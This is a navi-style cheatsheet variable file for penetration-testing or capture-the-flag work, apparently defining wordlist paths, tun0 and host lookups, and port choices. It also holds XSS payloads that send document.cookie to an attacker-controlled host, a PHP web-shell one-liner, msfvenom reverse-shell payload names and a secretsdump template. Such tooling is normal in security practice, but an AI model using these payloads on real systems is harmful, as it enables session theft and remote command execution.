# Common

<!-- cheat
export domain_ip
var domain = printf '%s\n' "$(sed -E 's/#.*$//' /etc/hosts | grep -v '^[[:space:]]*$' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+/ /g' | cut -d' ' -f2- | tr ' ' '\n' | grep -Ev '^(localhost|broadcasthost|ip6-allnodes|ip6-allrouters|ip6-localhost|ip6-loopback)?$' | sort -u)" --- --header 'Domains'
var rhost_ip = printf '%s' "$(sed -E 's/#.*$//' /etc/hosts | grep -w -- "$domain" | sed -E 's/^[[:space:]]+//; s/[[:space:]]+/ /g' | cut -d' ' -f1 | head -n1)"
-->

<!-- cheat
export tun_ip
var lhost = printf '%s\n' "$(ifconfig | grep 'tun0' -A 1 | grep 'inet ' | awk '{ print $2}')" '$IP' --- --header 'Tun IP'
-->

<!-- cheat
export templates
var ps_exec_template = printf '%s\n' '' '"cmd.exe /c \"type C:/Users/Administrator/Desktop/root.txt\"""' '-c sliver.exe' '' --- --header 'Templates'
var commands_template = printf '%s\n' '"cmd.exe /c \"type C:/Users/Administrator/Desktop/root.txt\"""' '' --- --header 'Templates'
var secrets_dump_templates = printf '%s\n' '-just-dc-user Administrator' '' --- --header 'Templates'
-->

<!-- cheat
export xss_quick_payloads
var script = echo "< script>" | tr -d ' '
var xss_payloads = printf '%s\n' "$scriptvar i=new Image(); i.src="http://$lhost:$lport/?cookie="+btoa(document.cookie);</script>" "<img src=y onerror="this.src='http://$lhost:$lport/?b='+document.cookie">" --- --header 'Quick xss payloads'
-->

<!-- cheat
export users
var user = printf '%s\n' '$user' 'Administrator' 'root' '$user' --- --header 'Users'
-->

<!-- cheat
export scheme
var scheme = printf '%s\n' http https --- --header 'Scheme'
-->

<!-- cheat
export wordlist_host
var wordlist_host = sh -c 'printf "%s\n" "/usr/share/seclists/Discovery/DNS/combined_subdomains.txt"; find /usr/share/seclists/Discovery/DNS -maxdepth 1 -type f -name "*.txt" -print | grep -v "/combined_subdomains.txt$" | sort' --- --header 'Wordlist'
-->

<!-- cheat
export wordlist_file
var wordlist_file = sh -c 'printf "%s\n" "/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt"; find /usr/share/seclists/Discovery/Web-Content -maxdepth 1 -type f -name "*.txt" -print | grep -v "/raft-medium-files-lowercase.txt$" | sort' --- --header 'Wordlist'
-->

<!-- cheat
export wordlist_dir
var wordlist_dir = sh -c 'printf "%s\n" "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt"; find /usr/share/seclists/Discovery/Web-Content -maxdepth 1 -type f -name "*.txt" -print | grep -v "/raft-medium-directories-lowercase.txt$" | sort' --- --header 'Wordlist'
-->

<!-- cheat
export wordlist_dir_common
var wordlist_dir_common = printf '%s\n' '/usr/share/wordlists/dirb/common.txt' '/usr/share/seclists/Discovery/Web-Content/common.txt' --- --header 'Directory wordlist'
-->

<!-- cheat
export wordlist_dir_medium
var wordlist_dir_medium = printf '%s\n' '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt' --- --header 'Directory wordlist'
-->

<!-- cheat
export wordlists_credentials
var wordlist_passwords_common = sh -c 'printf "%s\n" "/usr/share/wordlists/rockyou.txt"; find "/usr/share/wordlists/seclists/Passwords/Common-Credentials/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Wordlists Seclists(Common Passwords)'
var wordlist_passwords_leaked = sh -c 'printf "%s\n" "/usr/share/wordlists/rockyou.txt"; find "/usr/share/wordlists/seclists/Passwords/Leaked-Databases/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Wordlists Seclists(Common Passwords)'
var wordlist_users = sh -c 'printf "%s\n" "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"; find "/usr/share/wordlists/seclists/Usernames/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Wordlists Seclists(Usernames)'
-->

<!-- cheat
export wordlist_http_params
var wordlist_http_params = sh -c 'printf "%s\n" "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"; find "/usr/share/seclists/Discovery/Web-Content" -maxdepth 1 -type f \( -name "*parameter*.txt" -o -name "*params*.txt" \) -print | grep -v "/burp-parameter-names.txt$" | sort' --- --header 'HTTP parameter wordlist'
-->

<!-- cheat
export wordlist_usernames
var wordlist_usernames = sh -c 'printf "%s\n" "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"; find "/usr/share/seclists/Usernames" "/usr/share/wordlists/seclists/Usernames" -maxdepth 1 -type f ! -name ".*" -print 2>/dev/null | grep -v "/top-usernames-shortlist.txt$" | sort -u' --- --header 'Username wordlist'
-->

<!-- cheat
export wordlist_fuzz_special_chars
var wordlist_fuzz_special_chars = printf '%s\n' '/usr/share/seclists/Fuzzing/special-chars.txt' '/usr/share/wordlists/seclists/Fuzzing/special-chars.txt' --- --header 'Fuzzing wordlist'
-->

<!-- cheat
export wordlist_http_values
var wordlist_http_values = sh -c 'printf "%s\n" "/usr/share/seclists/Fuzzing/special-chars.txt" "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"; find "/usr/share/seclists/Fuzzing" "/usr/share/wordlists/seclists/Fuzzing" -maxdepth 1 -type f -name "*.txt" -print 2>/dev/null | grep -Ev "/(special-chars|raft-small-words)\.txt$" | sort -u' --- --header 'HTTP value wordlist'
-->

<!-- cheat
export wordlist_web_words
var wordlist_web_words = sh -c 'printf "%s\n" "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"; find "/usr/share/seclists/Discovery/Web-Content" -maxdepth 1 -type f -name "*words*.txt" -print | grep -v "/raft-small-words.txt$" | sort' --- --header 'Web content words wordlist'
-->

<!-- cheat
export payloads
var payloads = printf '%s\n' '<?php system($_GET["cmd"]);?>' '<img src=y onerror="this.src='http://$lhost:$lport/?b='+document.cookie">' '' --- --header 'Common payloads'
-->

<!-- cheat
export wordlist_passwords
var wordlists = sh -c 'printf "%s\n" "/usr/share/wordlists/rockyou.txt"; find "/usr/share/wordlists/seclists/Passwords/Common-Credentials/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Wordlists Seclists(Common Credentials)'
-->

<!-- cheat
export wordlists_users
var wordlists_users = sh -c 'printf "%s\n" "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"; find "/usr/share/wordlists/seclists/Usernames/" -maxdepth 1 -type f ! -name ".*" -printf "%p\n" | sort' --- --header 'Wordlists Seclists(Usernames)'
-->

<!-- cheat
export msfvenom
var format = printf '%s\n' 'exe' 'elf' 'bin' --- --header 'Formats'
var payloads = printf "%s\n" "windows/x64/shell/reverse_tcp" "windows/x64/meterpreter_reverse_http" "windows/x64/meterpreter_reverse_https" "windows/x64/meterpreter_reverse_tcp" "windows/x64/meterpreter/reverse_http" "windows/x64/meterpreter/reverse_https" "windows/x64/meterpreter/reverse_tcp" "linux/x64/meterpreter/reverse_tcp" "linux/x64/meterpreter_reverse_http" "linux/x64/meterpreter_reverse_https" "linux/x64/meterpreter_reverse_tcp" "linux/x64/shell/reverse_tcp" "linux/x64/shell_reverse_tcp" --- --header 'msfvenom Payloads'
-->

<!-- cheat
export files
var file = sh -c 'printf "%s\n" ""; find "$PWD/" -maxdepth 1 -type f ! -name ".*" -printf "%f\n" | grep -v "^$(basename "$PWD/")$" | sort' --- --header 'Current directory files'
-->

<!-- cheat
export lports
var lport = printf '%s\n' '1234' '4444' '443' '80' --- --header 'Ports'
-->

<!-- cheat
export webserver
var port = printf '%s\n' '80' '8080' '443' --- --header 'Ports'
var ftp_port = printf '%s\n' '21' --- --header 'FTP Ports'
var template = printf '%s\n' '>/dev/null 2>&1 & #Yes, no output' '& # Yes, output' ' #no' --- --header 'Start in background?'
var upload_location_template = printf '%s\n' 'c:\Users\Public\' 'c:\temp\' --- --header 'Upload location'
-->

<!-- cheat
export passwords
var pass = printf "%s\n" 'BotnetBuddies1337!' '' --- --header 'Passwords'
var new_password = printf "%s\n" 'BotnetBuddies1337!' '' --- --header 'Passwords'
-->
